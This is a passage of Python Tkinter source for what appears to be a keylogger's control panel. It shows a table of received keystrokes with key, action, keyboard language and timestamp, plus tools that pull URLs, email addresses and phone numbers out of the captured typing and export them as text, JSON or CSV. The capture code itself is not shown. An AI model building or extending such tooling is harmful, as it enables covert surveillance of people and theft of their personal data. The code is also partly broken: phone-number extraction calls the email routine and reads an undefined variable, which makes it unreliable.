Action_menu.add_command(label='Secure', compound='left', image=secure_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='software black screen (required password)', hidemargin=False, command=lambda :do_Secure())
########## Action > EXIT ##########
def Exit():
    if askyesno(title='Exit', message='Are you sure?'):
        app.quit()
Action_menu.add_command(label='Exit', compound='left', image=exit_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Exit the software', hidemargin=False, command=lambda :Exit())
# app.protocol("WM_DELETE_WINDOW", lambda :Exit())
# (END)#########################

########## HELP ##########
navbar.add_cascade(label="Help", state='disabled', menu=Help_menu)
########## HELP > ABOUT ##########
Help_menu.add_command(label='About', state='disabled', compound='left', image=about_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='About the author', hidemargin=False)
########## HELP > FAQ ##########
Help_menu.add_command(label='FAQ', state='disabled', compound='left', image=faq_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Frequently asked questions', hidemargin=False)
########## HELP > UPDATE ##########
Help_menu.add_command(label='Update', state='disabled', compound='left', image=update_icon, columnbreak=0, activeforeground='#2c2c2c', foreground='black', activebackground='#e2e2e2', accelerator='Update the software.', hidemargin=False)
# (END)#########################

Right_Panedwindow = Panedwindow(Main_Frame, orient='horizontal', takefocus=False)
Right_Panedwindow.pack(side='right', expand=True, fill='both', pady=5, padx=5)

Left_Panedwindow = Panedwindow(Main_Frame, takefocus=False) # , orient='horizontal'
Left_Panedwindow.pack(side='left', expand=True, fill='both', pady=5, padx=5)

KeyBard_CaptureVar = BooleanVar(value=False)
KeyBoard_Frame = LabelFrame(text='Keyboard')
KeyBoard_Frame.pack(side='left', expand=True, fill='both')
Left_Panedwindow.add(KeyBoard_Frame, weight=1)

# Keys_Table_sideVar = StringVar(value='bottom')
# def Change_KeysTable_side(
    # Keys_Table.pack(side=Keys_Table_sideVar.get(), expand=True, fill='both')

Keys_Table = Key_table(master=Right_Panedwindow)#, sideVar=Keys_Table_sideVar, onChange_execute=Change_KeysTable_side)

Simulator_frame = LabelFrame(text='Simulator')
# Right_Panedwindow.add(Simulator_frame)
Simulator_frame.pack(side='top', fill='both', padx=5)
Left_Panedwindow.add(Simulator_frame, weight=0)
# KeyBoard_Frame.add(Simulator_frame)
Simulator_controllers_frame = Frame(Simulator_frame)
Simulator_controllers_frame.pack(side='right', fill='both', pady=5, padx=5)

Simulator_textbox_SB_Y = Scrollbar(Simulator_frame)
Simulator_textbox_SB_Y.pack(side='right', fill='y')
Simulator_textbox_SB_X = Scrollbar(Simulator_frame, orient='horizontal')
Simulator_textbox_SB_X.pack(side='bottom', fill='x')

# tabstyle = tabular,wordprocessor
Simulator_textbox = Text(Simulator_frame, tabstyle='wordprocessor', tabs=4, selectbackground='red', undo=True, autoseparators=True, maxundo=-1, wrap='word', yscrollcommand=Simulator_textbox_SB_Y.set, xscrollcommand=Simulator_textbox_SB_X.set)

def Update_Simulator_steps():
    pass
    # Simulator_Steps['text'] = f"{Simulator_StepsVar.get()}/{}"
# Simulator_textbox.bind('<KeyPress>', lambda a:Update_Simulator_steps())
# Simulator_textbox.bind('<KeyRelease>', lambda a:Update_Simulator_steps())

def Insert_Simulator(content):
    if Simulator_autoSimulateVar.get():
        Simulator_textbox.insert('end', content)
Simulator_textbox_SB_Y.config(command=Simulator_textbox.yview)
Simulator_textbox_SB_X.config(command=Simulator_textbox.xview)
Simulator_textbox.bind('<Control-Z>', lambda a:redo(Simulator_textbox))
Simulator_textbox.pack(side='top', fill='both', expand=True)
Simulator1_controllers_frame = LabelFrame(Simulator_controllers_frame, text='Settings')
Simulator1_controllers_frame.pack(side='top', fill='both', ipadx=13, expand=True)

Simulator_autoSimulateVar = BooleanVar(value=True)
Simulator_autoSimulate = Checkbutton(Simulator1_controllers_frame, text='Auto simulate', takefocus=False, cursor='hand2', onvalue=True, offvalue=False, variable=Simulator_autoSimulateVar)
Simulator_autoSimulate.pack(side='top', pady=10)

Simulator_Save = Button(Simulator1_controllers_frame, text='Save', takefocus=False, cursor='hand2', command=lambda :do_Save(Simulator_textbox.get(1.0, 'end')))
Simulator_Save.pack(side='top', fill='x', padx=5)
Simulator_Clear = Button(Simulator1_controllers_frame, text='Clear', takefocus=False, cursor='hand2', command=lambda :Simulator_textbox.delete(1.0, 'end'))
Simulator_Clear.pack(side='top', fill='x', padx=5)
####################################################################

KeyBoard_actions_Frame = LabelFrame(KeyBoard_Frame, text='Settings')
KeyBoard_actions_Frame.pack(side='right', fill='both', padx=12, pady=5)

KeyBoard_SB_Y = Scrollbar(KeyBoard_Frame)
KeyBoard_SB_Y.pack(side='right', fill='y')
KeyBoard_SB_X = Scrollbar(KeyBoard_Frame, orient='horizontal')
KeyBoard_SB_X.pack(side='bottom', fill='x')

Label(KeyBoard_actions_Frame, text='Table:').pack(side='top', fill='x', anchor='w')
isKeyBoardTable_BrowseVar = BooleanVar(value=False)
KeyBoardTable_Browse = Checkbutton(KeyBoard_actions_Frame, text='Browse', variable=isKeyBoardTable_BrowseVar, takefocus=False)
KeyBoardTable_Browse.pack(side='top', fill='x', padx=10)
###
def Export_Table(tableName:str, Variable:StringVar, table:Treeview, csv_headders):
    all_data = []
    all_string_data = ''
    for id in table.get_children():
        curr_data = table.item(id)['values']
        all_data.append(curr_data)
    for d1 in all_data:
        for d2 in d1:
            all_string_data += str(d2)
            all_string_data += ' '
        all_string_data += '\n'

    type = Variable.get()
    if type == 'Plaintext':
        file = asksaveasfile(title=f'Save {tableName} data as Plaintext', defaultextension="txt", confirmoverwrite=True)
        if file:
            with open(file.name, 'w') as f:
                f.write(all_string_data)
            f.close()
    elif type == 'JSON':
        file = asksaveasfile(title=f'Save {tableName} data as JSON', defaultextension="json", confirmoverwrite=True)
        if file:
            with open(file.name, 'w') as f:
                f.write(json.dumps(all_data))
            f.close()
    elif type == 'CSV':
        file = asksaveasfile(title=f'Save {tableName} data as CSV', defaultextension="csv", confirmoverwrite=True)
        if file:
            with open(file.name, 'w') as f:
                write = csv.writer(f)
                write.writerow(list(csv_headders))
                write.writerows(all_data)
            f.close()

keyboard_columns = ('#', 'Key', 'Action', 'For', 'Language', 'Time')
KeyBoard_table = Treeview(KeyBoard_Frame, columns=keyboard_columns, show='headings', takefocus=False, xscrollcommand=KeyBoard_SB_X.set, yscrollcommand=KeyBoard_SB_Y.set)

supported_export_formats = ['Plaintext', 'JSON', 'CSV']
KeyboardTable_ExportVar = StringVar(value=supported_export_formats[0])
Label(KeyBoard_actions_Frame, text='Data:').pack(side='top', fill='x', anchor='w')
KeyBoardTable_Export = Button(KeyBoard_actions_Frame, text='Export', takefocus=False, cursor='hand2', command=lambda :Export_Table(tableName='keyboard', table=KeyBoard_table, Variable=KeyboardTable_ExportVar, csv_headders=keyboard_columns))
KeyBoardTable_Export.pack(side='top', fill='x', padx=10)
KeyBoardTable_Export_Plaintext = Radiobutton(KeyBoard_actions_Frame, text='Plaintext', takefocus=False, value='Plaintext', variable=KeyboardTable_ExportVar)
KeyBoardTable_Export_Plaintext.pack(side='top', fill='x', padx=10)
KeyBoardTable_Export_Json = Radiobutton(KeyBoard_actions_Frame, text='Json', takefocus=False, value='JSON', variable=KeyboardTable_ExportVar)
KeyBoardTable_Export_Json.pack(side='top', fill='x', padx=10)
KeyBoardTable_Export_CSV = Radiobutton(KeyBoard_actions_Frame, text='CSV', takefocus=False, value='CSV', variable=KeyboardTable_ExportVar)
KeyBoardTable_Export_CSV.pack(side='top', fill='x', padx=10)

# hold => 0.4999
def KeyBoard_table_Select(event):
    pass
    # if KeyBoard_table.selection():
    #     Simulator_simulate_btn.config(state='normal', cursor='hand2')
    #     Simulator_simulate_selected_btn.config(state='normal', cursor='hand2')
    # else:
    #     Simulator_simulate_btn.config(state='disabled', cursor='')
    #     Simulator_simulate_selected_btn.config(state='disabled', cursor='')
def Keystroke_insert(key, action, for_, keyboard_language):
    time = datetime.datetime.now().strftime(f"%Y/%d/%m - %I:%M:%S.{datetime.datetime.now().strftime('%f')[:3]} %p")
    language = translate_id(keyboard_language)
    Target_keyboardLanguage_lbl.config(text=language)
    KeyBoard_table.insert(parent='', index='end', values=(
        len(KeyBoard_table.get_children()) + 1,
        key,
        action,
        for_,
        language,
        time
    ))
    if KeyBoard_table.get_children() and not isKeyBoardTable_BrowseVar.get():
        KeyBoard_table.see(KeyBoard_table.get_children()[-1])
        KeyBoard_table.focus(KeyBoard_table.get_children()[-1])
KeyBoard_table.bind('<<TreeviewSelect>>', KeyBoard_table_Select)

KeyBoard_SB_Y.config(command=KeyBoard_table.yview)
KeyBoard_SB_X.config(command=KeyBoard_table.xview)
KeyBoard_table.pack(expand=True, fill='both')
kc = keyboard_columns
KeyBoard_table.heading(kc[0], text=kc[0])
KeyBoard_table.column(kc[0], width=50, anchor='center')
def AddKeyboardTableHeaders():
    for header in keyboard_columns[1:]:
        KeyBoard_table.heading(header, text=header)
        KeyBoard_table.column(header, anchor='center', stretch=True)
AddKeyboardTableHeaders()

Extracted_frame = Frame(Right_Panedwindow)
Right_Panedwindow.add(Extracted_frame)
Extracted_frame.pack(side='bottom', expand=True, fill='both', padx=5, pady=5)
# KeyBoard_Frame.add(Extracted_frame)
def do_Extract(list, type:str):
    result = []
    if type == 'url':
        result = Extract.url(data)
    elif type == 'email':
        result = Extract.email(data)
    elif type == 'phone-number':
        result = Extract.email(data)

    if len(result) > 0:
        list.delete(0, 'end')
        for item in result:
            list.insert('end', item)

def do_Copy(list):
    if list.curselection():
        index = list.curselection()[0]
        PYcopy(list.get(index, index)[0])

def do_Save(content):
    file = asksaveasfile(title='Save to:', defaultextension='txt')
    if file:
        with open(file.name, 'w') as output:
            output.write(content)

def do_Sort(list):
    data = sorted(list.get(0, 'end'))
    if data:
        list.delete(0, 'end')
        list.insert('end', *data)

############## URLS ##############
urls_list_labelframe = LabelFrame(Extracted_frame, text='Urls')
urls_list_labelframe.pack(side='left', expand=True, fill='both')
urls_list_frame = Frame(urls_list_labelframe)
urls_list_frame.pack(side='top', expand=True, fill='both')
urls_SB_Y = Scrollbar(urls_list_frame)
urls_SB_Y.pack(side='right', fill='y')
urls_SB_X = Scrollbar(urls_list_frame, orient='horizontal')

selected_url = StringVar()
urls_list = Listbox(urls_list_frame, activestyle='none', relief='flat', selectmode='browse', listvariable=selected_url, yscrollcommand=urls_SB_Y.set, xscrollcommand=urls_SB_X.set)
urls_SB_Y.config(command=urls_list.yview)
urls_SB_X.config(command=urls_list.xview)
urls_list.pack(expand=True, fill='both')

# for i in range(1000):
#     urls_list.insert('end', ''.join([random.choice(string.ascii_letters + string.punctuation) for a in range(random.randint(10, 100))]))
urls_list_controllters_frame = Frame(urls_list_frame)
urls_list_controllters_frame.pack(side='bottom', fill='x', pady=3)

Extractor_url_frame = Frame(urls_list_controllters_frame)
Extractor_url_frame.pack(side='left', fill='both', expand=True)
Extract_url_btn = Button(Extractor_url_frame, text='Extract', cursor='hand2', takefocus=False, command=lambda :do_Extract(urls_list, 'url'))
Extract_url_btn.pack(side='top', fill='x', expand=True)
Copy_url_btn = Button(Extractor_url_frame, text='Copy', cursor='hand2', takefocus=False, command=lambda :do_Copy(urls_list))
Copy_url_btn.pack(side='top', fill='x', expand=True)
Sort_url_btn = Button(Extractor_url_frame, text='Sort', cursor='hand2', takefocus=False, command=lambda :do_Sort(urls_list))
Sort_url_btn.pack(side='top', fill='x', expand=True)
Save_url_btn = Button(Extractor_url_frame, text='Save', cursor='hand2', takefocus=False, command=lambda :do_Save('\n'.join(urls_list.get(0, 'end'))))
Save_url_btn.pack(side='top', fill='x', expand=True)
Clear_url_btn = Button(Extractor_url_frame, text='Clear', cursor='hand2', takefocus=False, command=lambda :urls_list.delete(0, 'end'))
Clear_url_btn.pack(side='top', fill='x', expand=True)

urls_SB_X.pack(side='bottom', fill='x')

ToolTip(Extract_url_btn, 'Extract url(s) from received keystrokes.')
ToolTip(Copy_url_btn, 'Copy selected url from the extractor.')
# img = Image.open(r"C:\Users\khlid\Downloads\antenna.png")
# resized_img = img.resize((30, 30), resample=Image.ANTIALIAS)
# img = ImageTk.PhotoImage(resized_img)
ToolTip(Save_url_btn, 'Save extracted url(s) to a file.')#, image=img)
ToolTip(Clear_url_btn, 'Clear all extractor data.')
##########################################

############## EMAILS ##############
emails_list_frame = LabelFrame(Extracted_frame, text='Emails')
emails_list_frame.pack(side='left', expand=True, fill='both')
emails_SB_Y = Scrollbar(emails_list_frame)
emails_SB_Y.pack(side='right', fill='y')
emails_SB_X = Scrollbar(emails_list_frame, orient='horizontal')

emails_list = Listbox(emails_list_frame, activestyle='none', relief='flat', selectmode='browse', yscrollcommand=emails_SB_Y.set, xscrollcommand=emails_SB_X.set)
emails_SB_Y.config(command=emails_list.yview)
emails_SB_X.config(command=emails_list.xview)
emails_list.pack(expand=True, fill='both')
######
emails_list_controllters_frame = Frame(emails_list_frame)
emails_list_controllters_frame.pack(side='bottom', fill='x', pady=3)
##
Extractor_email_frame = Frame(emails_list_controllters_frame)
Extractor_email_frame.pack(side='left', fill='both', expand=True)
Extract_email_btn = Button(Extractor_email_frame, text='Extract', cursor='hand2', takefocus=False, command=lambda :do_Extract(emails_list, 'email'))
Extract_email_btn.pack(side='top', fill='x', expand=True)
Copy_email_btn = Button(Extractor_email_frame, text='Copy', cursor='hand2', takefocus=False, command=lambda :do_Copy(emails_list))
Copy_email_btn.pack(side='top', fill='x', expand=True)
Sort_email_btn = Button(Extractor_email_frame, text='Sort', cursor='hand2', takefocus=False, command=lambda :do_Sort(emails_list))
Sort_email_btn.pack(side='top', fill='x', expand=True)
Save_email_btn = Button(Extractor_email_frame, text='Save', cursor='hand2', takefocus=False, command=lambda :do_Save('\n'.join(emails_list.get(0, 'end'))))
Save_email_btn.pack(side='top', fill='x', expand=True)
Clear_email_btn = Button(Extractor_email_frame, text='Clear', cursor='hand2', takefocus=False, command=lambda :emails_list.delete(0, 'end'))
Clear_email_btn.pack(side='top', fill='x', expand=True)

emails_SB_X.pack(side='bottom', fill='x')

ToolTip(Extract_email_btn, 'Extract email(s) from received keystrokes.')
ToolTip(Copy_email_btn, 'Copy selected email from the extractor.')
ToolTip(Save_email_btn, 'Save extracted email(s) to a file.')
ToolTip(Clear_email_btn, 'Clear all extractor data.')
##########################################

############## PHONE NUMBER ##############
phonenumbers_list_frame = LabelFrame(Extracted_frame, text='Phone numbers')
phonenumbers_list_frame.pack(side='left', expand=True, fill='both')
phonenumbers_SB_Y = Scrollbar(phonenumbers_list_frame)
phonenumbers_SB_Y.pack(side='right', fill='y')
phonenumbers_SB_X = Scrollbar(phonenumbers_list_frame, orient='horizontal')

phonenumbers_list = Listbox(phonenumbers_list_frame, activestyle='none', relief='flat', selectmode='browse', yscrollcommand=phonenumbers_SB_Y.set, xscrollcommand=phonenumbers_SB_X.set)
phonenumbers_SB_Y.config(command=phonenumbers_list.yview)
phonenumbers_SB_X.config(command=phonenumbers_list.xview)
phonenumbers_list.pack(expand=True, fill='both')

phonenumbers_list_controllters_frame = Frame(phonenumbers_list_frame)
phonenumbers_list_controllters_frame.pack(side='bottom', fill='x', pady=3)
##
Extractor_phonenumber_frame = Frame(phonenumbers_list_controllters_frame)
Extractor_phonenumber_frame.pack(side='left', fill='both', expand=True)
Extract_phonenumber_btn = Button(Extractor_phonenumber_frame, text='Extract', cursor='hand2', takefocus=False, command=lambda :do_Extract(phonenumbers_list, 'phone-number'))
Extract_phonenumber_btn.pack(side='top', fill='x', expand=True)
Copy_phonenumber_btn = Button(Extractor_phonenumber_frame, text='Copy', cursor='hand2', takefocus=False, command=lambda :do_Copy(phonenumbers_list))
Copy_phonenumber_btn.pack(side='top', fill='x', expand=True)
Sort_phonenumber_btn = Button(Extractor_phonenumber_frame, text='Sort', cursor='hand2', takefocus=False, command=lambda :do_Sort(phonenumbers_list))
Sort_phonenumber_btn.pack(side='top', fill='x', expand=True)
Save_phonenumber_btn = Button(Extractor_phonenumber_frame, text='Save', cursor='hand2', takefocus=False, command=lambda :do_Save('\n'.join(phonenumbers_list.get(0, 'end'))))
Save_phonenumber_btn.pack(side='top', fill='x', expand=True)
Clear_phonenumber_btn = Button(Extractor_phonenumber_frame, text='Clear', cursor='hand2', takefocus=False, command=lambda :phonenumbers_list.delete(0, 'end'))
Clear_phonenumber_btn.pack(side='top', fill='x', expand=True)

phonenumbers_SB_X.pack(side='bottom', fill='x')

ToolTip(Extract_phonenumber_btn, 'Extract phone-number(s) from received keystrokes.')
ToolTip(Copy_phonenumber_btn, 'Copy selected phone-number from the extractor.')
ToolTip(Save_phonenumber_btn, 'Save extracted phone-number(s) to a file.')
ToolTip(Clear_phonenumber_btn, 'Clear all extractor data.')
##########################################



app.config(menu=navbar)
app.mainloop()
# vl.stop()